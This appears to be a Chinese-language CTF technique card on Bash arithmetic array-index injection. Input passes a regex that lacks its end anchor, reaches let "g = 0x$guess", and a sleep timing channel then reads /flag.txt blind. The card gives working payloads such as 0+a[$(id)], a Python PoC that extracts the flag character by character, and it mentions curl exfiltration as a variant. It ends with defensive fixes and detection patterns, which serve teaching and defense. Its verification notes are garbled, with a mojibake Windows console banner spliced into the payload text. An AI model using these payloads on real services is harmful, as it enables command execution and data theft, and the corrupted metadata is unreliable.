---
id: ctf-misc-bash-arithmetic-array-index-sleep-blind
title: Bash 算术数组下标注入 + sleep 计时盲读：正则缺 $ 与 let 十六进制前缀绕过
type: scenario
domain: ctf
path: ctf/misc
technique: bash-arithmetic-array-index-sleep-blind
aliases:
- Bash 算术注入
- let 16 进制前缀
- 正则缺 $
- sleep 时间盲读
- arr[$(cmd)]
- Lottery
tags:
- ctf
- misc
- bash
- arithmetic-expansion
- command-substitution
- blind
- timing
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V161
  verified_at: '2026-11-06T09:58:06+08:00'
  notes: "已对照原文核对：^[0-9a-fA-F]+ 缺 $、let \"g = 0x\"、arr[Microsoft Windows [°汾 10.0.26200.9711]\r\n(c) Microsoft Corporation¡£±£ÁôËùÓÐȨÀû¡£\r\n\r\nE:\\Îĵµ\\vuln-masterhub>] 命令替换、sleep 计时盲读 /flag.txt、payload 与字符集均一致；未复跑 PoC。"
---

## 一句话结论

服务用 `^[0-9a-fA-F]+` 校验输入（没有 `$` 锚定结尾），再执行 `let "g = 0x$guess"`。攻击者提交以十六进制开头、后面跟 `0+a[$(...)]` 的字符串，既通过前缀校验，又让 Bash 在算术上下文执行 `$(...)`；由于输出被丢弃，用 `test ... && sleep` 构造时间侧信道，逐字符盲读 `/flag.txt`。

## 原理

- **正则缺 `$`**：`^[0-9a-fA-F]+` 只要求开头是 hex，不要求整串匹配；`0+a[$(cmd)]` 以 `0` 开头，能通过校验。
- **`let` 的算术上下文**：`let "g = 0x$guess"` 把输入拼进 Bash 算术表达式；Bash 在求值前会对表达式做参数/命令替换，`$(cmd)` 先执行。
- **数组下标也是算术表达式**：`a[$(cmd)]` 中 `$(cmd)` 先执行，输出作为下标；即使下标不是数字导致报错，命令副作用已发生。
- **输出不可见**：服务端可能丢弃 stdout/stderr 或把结果当数组下标，无法直接回显；攻击者用 `test "$(cut -cN /flag.txt)" = "ch" && sleep 0.35; echo 0` 让命令在匹配时睡 0.35 秒，否则立即 `echo 0` 保持下标合法。
- **时间盲读**：逐位置、逐字符提交 payload；测量响应时间，明显高于基线的字符即匹配；基线用 `0` 请求校准（中位数抗抖动）。
- **字符集**：`string.ascii_letters + string.digits + "_{}()?!-"` 等按 flag 格式调整；遇到 `}` 结束。

## 触发条件

- 服务端把用户输入拼进 Bash 算术表达式（`let`、`$(( ))`、数组下标），且只做前缀/弱正则校验（缺少 `$`/未限制字符集）。
- 命令替换 `$()`/反引号未被过滤；Bash 版本支持算术上下文中的命令替换。
- 攻击者能观测响应时间，且 `sleep` 时长明显大于网络抖动；可多次校准基线。
- 目标文件（如 `/flag.txt`）对服务进程可读，`cut/test` 等命令可用。

## 利用步骤

1. **确认注入**：提交 `0+a[$(id)]`，观察是否报错/延迟/异常；若返回正常，尝试 `0+a[$(sleep 1;echo 0)]` 测时间差。
2. **校准基线**：提交纯 `0` 多次，取响应时间中位数作为 baseline。
3. **构造盲读 payload**：对位置 `pos` 和候选字符 `ch`：
   ```text
   0+a[$(test "$(cut -c{pos} /flag.txt)" = "{ch}" && sleep 0.35; echo 0)]
   ```
   匹配时 sleep，响应变慢；不匹配立即返回。
4. **逐字符扫描**：按字符集顺序发送，`elapsed > baseline + 0.2` 判为命中；记录字符，进入下一位置。
5. **结束条件**：读到 `}` 或达到最大长度；拼接得到 flag。
6. **调参**：网络抖动大时增大 `SLEEP_SEC`/重复采样；若 `cut` 不可用，用 `dd`/`head -c`/`grep` 等替代。

## PoC

```python
CHARSET = string.ascii_letters + string.digits + "_{}()?!-"
SLEEP_SEC = 0.35
THRESHOLD = 0.20

def one_query(pos, ch, base):
    payload = (f'0+a[$('
               f'test "$(cut -c{pos} /flag.txt)" = "{ch}" && sleep {SLEEP_SEC}; '
               f'echo 0)]')
    t0 = time.time(); send(payload); recv(); return time.time() - t0

base = median([measure("0") for _ in range(7)])
flag = ""
for pos in range(1, 80):
    for ch in CHARSET:
        if one_query(pos, ch, base) > base + THRESHOLD:
            flag += ch; print(pos, ch, flag); break
    if flag.endswith("}"): break
```

原文在 `let "g = 0x$guess"` 与 `^[0-9a-fA-F]+` 的服务上逐字符读出 flag；本卡不执行 PoC。

## 变体与关联

- **有回显版本**：若错误信息/输出可见，直接用 `a[$(cat flag)]` 把内容带进报错，见 [[binary-pwn-sandbox-escape-bash-arithmetic-expansion-command-substitution]]；本卡是“输出不可见”时的 sleep 盲读变体。
- **其它副作用**：`curl` 外带、写文件、`kill -0`/`exit` 改变连接状态、DNS 查询；时间只是其中一种。
- **其它算术上下文**：`$(( ))`、`(( ))`、`declare -i`、数组下标、`${arr[expr]}`；绕过字符黑名单时可换入口。
- **关联**：[[pentest-privilege-escalation-bash-arithmetic-log-injection]]（日志注入算术提权）、[[web-generic-sqli-cartesian-product-time-blind]]（时间盲注）、[[ctf-misc-short-circuit-expensive-expression-quaternary-timing]]（另一类时间侧信道）。
- **边界**：需要命令替换未被过滤、可观测时间差；若服务端使用 `set -u`/严格数字校验/固定长度/超时、或 `sleep` 被禁用，利用失败。

## 检测与防御

- **输入校验**：正则加 `$` 锚定，只允许纯十六进制/数字；用 `[[ $guess =~ ^[0-9a-fA-F]+$ ]]` 并拒绝其它字符；不要直接把用户输入拼进 `let`/算术表达式。
- **避免算术上下文执行**：用参数化/显式数值转换（`printf '%d'`、`bc`）并校验；禁用命令替换/反引号。
- **最小权限**：服务进程以低权限运行，flag 不可读；限制 `sleep`/`cut` 等命令与执行时间。
- **检测**：输入中出现 `$(`、反引号、`a[`、`0+` 等模式；请求响应时间呈明显双峰；同一会话逐字符扫描。
- **响应**：阻断/告警，审计是否已泄露 flag，修复校验逻辑。
